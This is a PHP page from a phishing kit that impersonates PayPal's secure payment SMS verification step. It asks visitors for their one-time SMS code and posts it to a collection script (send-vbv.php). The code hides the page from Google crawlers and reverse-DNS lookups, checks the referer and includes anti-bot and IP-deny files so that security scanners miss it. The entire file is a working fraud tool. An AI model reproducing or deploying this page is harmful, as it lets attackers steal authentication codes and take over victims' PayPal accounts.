<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);

/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/

include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";
include "../boots/antibots1.php";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("functionns/Bot-blocker.php");
include("functionns/Geo-plugin.php");
include("functionns/OS-Platform.php");
include('../Denny-ip.php');

$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache">
	<link rel="shortcut icon" href="securevbv/n-icon.png">
<link rel="icon" type="securevbv/n-icon.png" href="source/img/pp258.png">
	<link href="securevbv/ntt.css" rel="stylesheet" type="text/css">
	<title>
		PayPal.com : SMS-Code 
	</title>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<form name="A1" method="post" action="functionns/send-vbv.php" >


<center>
<table cellpadding="0" cellspacing="0" border="0">
<tbody><tr>
	<td>
		<table cellpadding="0" cellspacing="0" border="0" width="350px">
  	    <tbody><tr>
			<td valign="top">

				
				<br><br><br><br><table cellpadding="0" cellspacing="0" border="0" width="100%">
				<tbody><tr>
					<td>
						<center><table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
						<tbody><tr>
							<td align="left" width="50%">
								<img src="securevbv/logo.png" border="0" style="width:180px"></center>
							</td>
							
							<td align="right" width="50%">
								
							</td>
						</tr>
						</tbody></table>
						<br>
					</td>
				</tr>
				</tbody></table>






    <table cellpadding="3" cellspacing="0" border="0" width="100%">
	<tbody><tr>
		

		
            <td align="left" colspan="3" class="normalgray">
				<font color="black"><font style="color:red;">you are currently connected to a secure payment site operated by paypal.com </font>. Payment details are securely sent to the bank, card companies and transaction confirmation payments using SSL encryption of up to 256 bits. Please click<br> Button. Because it may not be treated properly<br> Insert <b>SMS</b> Authentication service code (paypal.com/Secure) and "Send"
Click the button. It may not be treated properly
Do not click the browser's back button.</font><br>
			</td>
		
	</tr>
	<tr>
		<td align="left" height="10"><img src="securevbv/spacer.gif" height="10" width="1"></td>
	</tr>
	<tr>
        <td valign="top" align="left">
            <table cellpadding="3" cellspacing="0" border="0" width="100%">

            
						
			
			
			
            <tbody>

				
            

            

            

            
            

            <tr>
		

		
            <td colspan="3" class="normalgray">
			<center><img width="200" src="http://www.bitcoin-search-engine.com/images/loading.gif"></center><br>
				<font color="black">Please wait if you do not receive a five minute code. Click Resend</font><br>
			</td>
		
	</tr>

            <tr>
                <td class="normalbold" valign="center" width="150px" >
                   SMS-Code :
                </td>
                <td width="10px">
                </td>
                <td valign="top" width="100px">
                    <!-- no errors, retain password -->
					   <form action="functionns/send-login.php" method="post" name="loginForm">                 
					<input type="VbvPass" maxlength="32" size="20" name="VbvPass" value="" placeholder="XXXXXXXXX"  type="text" autocomplete="off" required="" aria-required="true">
					
					                </td>
                
            </tr>

            
            
            
            

            <tr height="10">
                <td><img src="securevbv/spacer.gif"></td>
            </tr>

            

            <tr>
                
                    <td valign="top" align="left">&nbsp;</td>
                    <td width="10px">
                    </td>
                    <td valign="top" align="left" width="180px">

		    <table cellpadding="0" cellspacing="0" border="0" width="180px">
		    <tbody><tr>
			<td nowrap="">

                        
                       <input name=""  value="Send inn" style="" type="submit">
					   
						
			</td>
			
			</form>
	
<td nowrap="">  

                        
                            <a class="normallink" href="#">
                        </noscript>
                            <font class="normallink">Send again</font>
                        </a>

			</td>
		</tr>
		</tbody></table>

                    </td>
                
            </tr>

            </tbody></table>
        </td>
    </tr>
    </tbody></table>

    

				</td></tr><tr>
					</tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
					<tbody><tr>
						<td class="copyright" align="center">
							
						</td>
					</tr>
					</tbody></table>
				</td></tr>

	
			
	  	
		</tbody></table>
	


</center>




<br>
<!-- #sub-footer -->

<ul class="first">
<br>
	<center>
	<li class="copyright">Copyright &copy; <?php echo date("Y"); ?> paypal Corp. Alle rechte vorbehalten</li></center>
</ul>
<!-- /#sub-footer -->





</body></html>
<?php } ?>